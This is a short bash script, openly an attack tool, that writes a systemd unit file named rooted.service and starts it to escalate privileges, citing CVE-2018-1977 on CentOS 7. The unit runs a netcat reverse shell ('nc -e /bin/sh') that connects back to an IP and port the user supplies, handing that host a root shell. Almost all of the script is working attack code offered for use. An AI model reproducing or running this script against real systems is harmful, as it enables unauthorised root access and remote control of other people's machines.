#!/bin/bash
# Simple script to write systemd services

echo "*** This script outputs a systemd service config with a nc rev shell"
echo "*** Tested on CentOS 7 using CVE-2018-1977"
echo "*** Should be portable to privescs where systemctl has root privs"

usage() { echo "[+] Usage: $0 [-h <ip address>] [-p <port>]" 1>&2; exit 1; }

while getopts ":h:p:" o; do
	case "${o}" in
		h)
			IP=${OPTARG}
			;;
		p)
			PORT=${OPTARG}
			;;
		:)
			usage
			;;
	esac
done


if [ -z "${IP}" ] || [ -z "${PORT}" ]; then
	usage
fi

# Replace this shell with your own if nc lacks -e
rootshell="/bin/nc -e /bin/sh  ${IP} ${PORT}"

cat > rooted.service << EOF
[Unit]
Description=rootshell

[Service]
Type=notify
ExecStart=${rootshell}

[Install]
WantedBy=multi-user.target
EOF

echo "[+] rooted.service written. Attempting to launch service..."
systemctl link $PWD/rooted.service && systemctl start rooted

